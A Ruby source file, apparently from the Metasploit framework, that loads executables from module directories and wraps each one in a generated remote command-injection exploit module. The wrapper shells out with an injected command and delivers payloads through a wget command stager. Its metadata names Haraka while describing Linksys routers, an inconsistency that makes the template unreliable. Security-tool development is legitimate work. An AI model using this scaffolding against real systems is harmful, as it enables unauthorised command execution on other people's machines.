# -*- coding: binary -*-

require 'msf/core/modules/loader'
require 'msf/core/modules/loader/base'

# Concerns loading executables from a directory as modules
class Msf::Modules::Loader::Executable < Msf::Modules::Loader::Base
  # Returns true if the path is a directory
  #
  # @param (see Msf::Modules::Loader::Base#loadable?)
  # @return [true] if path is a directory
  # @return [false] otherwise
  def loadable?(path)
    if File.directory?(path)
      true
    else
      false
    end
  end

  protected

  # Yields the module_reference_name for each module file found under the directory path.
  #
  # @param [String] path The path to the directory.
  # @param [Hash] opts Input Hash.
  # @yield (see Msf::Modules::Loader::Base#each_module_reference_name)
  # @yieldparam [String] path The path to the directory.
  # @yieldparam [String] type The type correlated with the directory under path.
  # @yieldparam module_reference_name (see Msf::Modules::Loader::Base#each_module_reference_name)
  # @return (see Msf::Modules::Loader::Base#each_module_reference_name)
  def each_module_reference_name(path, opts={})
    whitelist = opts[:whitelist] || []
    ::Dir.foreach(path) do |entry|
      full_entry_path = ::File.join(path, entry)
      type = entry.singularize

      unless ::File.directory?(full_entry_path) and
             module_manager.type_enabled? type
        next
      end

      full_entry_pathname = Pathname.new(full_entry_path)

      # Try to load modules from all the files in the supplied path
      Rex::Find.find(full_entry_path) do |entry_descendant_path|
        if File.executable?(entry_descendant_path) && !File.directory?(entry_descendant_path)
          entry_descendant_pathname = Pathname.new(entry_descendant_path)
          relative_entry_descendant_pathname = entry_descendant_pathname.relative_path_from(full_entry_pathname)
          relative_entry_descendant_path = relative_entry_descendant_pathname.to_s

          # The module_reference_name doesn't have a file extension
          module_reference_name = File.join(File.dirname(relative_entry_descendant_path), File.basename(relative_entry_descendant_path, '.*'))

          yield path, type, module_reference_name
        end
      end
    end
  end

  # Returns the full path to the module file on disk.
  #
  # @param (see Msf::Modules::Loader::Base#module_path)
  # @return [String] Path to module file on disk.
  def module_path(parent_path, type, module_reference_name)
    # The extension is lost on loading, hit the disk to recover :(
    partial_path = File.join(DIRECTORY_BY_TYPE[type], module_reference_name)
    full_path = File.join(parent_path, partial_path)

    Rex::Find.find(File.dirname(full_path)) do |mod|
      if File.basename(full_path, '.*') == File.basename(mod, '.*')
        return File.join(File.dirname(full_path), File.basename(mod))
      end
    end

    ''
  end

  # Loads the module content from the on disk file.
  #
  # @param (see Msf::Modules::Loader::Base#read_module_content)
  # @return (see Msf::Modules::Loader::Base#read_module_content)
  def read_module_content(parent_path, type, module_reference_name)
    full_path = module_path(parent_path, type, module_reference_name)
    unless File.executable?(full_path)
      load_error(full_path, Errno::ENOENT.new)
      return ''
    end
    %Q|
require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Haraka Remote Command Injection',
      'Description' => %q{
        Some Linksys E-Series Routers are vulnerable to an unauthenticated OS command
        injection. This vulnerability was used from the so-called "TheMoon" worm. There
        are many Linksys systems that are potentially vulnerable, including E4200, E3200, E3000,
        E2500, E2100L, E2000, E1550, E1500, E1200, E1000, and E900. This module was tested
        successfully against an E1500 v1.0.5.
      },
      'Author'      =>
        [
          'Johannes Ullrich', #worm discovery
          'Rew', # original exploit
          'infodox', # another exploit
          'Michael Messner <devnull[at]s3cur1ty.de>', # Metasploit module
          'juan vazquez' # minor help with msf module
        ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          [ 'EDB', '31683' ],
          [ 'BID', '65585' ],
          [ 'OSVDB', '103321' ],
          [ 'PACKETSTORM', '125253' ],
          [ 'PACKETSTORM', '125252' ],
          [ 'URL', 'https://isc.sans.edu/diary/Linksys+Worm+%22TheMoon%22+Summary%3A+What+we+know+so+far/17633' ],
          [ 'URL', 'https://isc.sans.edu/forums/diary/Linksys+Worm+TheMoon+Captured/17630' ]
        ],
      'DisclosureDate' => 'Feb 13 2014',
      'Privileged'     => true,
      'Platform'       => %w{ linux unix },
      'Payload'        =>
        {
          'DisableNops' => true
        },
      'Targets'        =>
        [
          [ 'Linux x64 Payload',
            {
            'Arch' => ARCH_X64,
            'Platform' => 'linux'
            }
          ]
        ],
      'DefaultTarget'   => 0,
      'DefaultOptions' => { 'WfsDelay' => 5 }
      ))
  end

  def execute_command(cmd, opts)
    to = 'admin@arnold'
    rhost = '192.168.244.130'
    `#{module_path(parent_path, type, module_reference_name)} -c "\#{cmd}" -t \#{to} -m \#{rhost}`
    true
  end

  def exploit
    print_status("Trying to access the vulnerable URL...")

    print_status("Exploiting...")
    execute_cmdstager({:flavor  => :wget})
  end


end
    |
  end
end
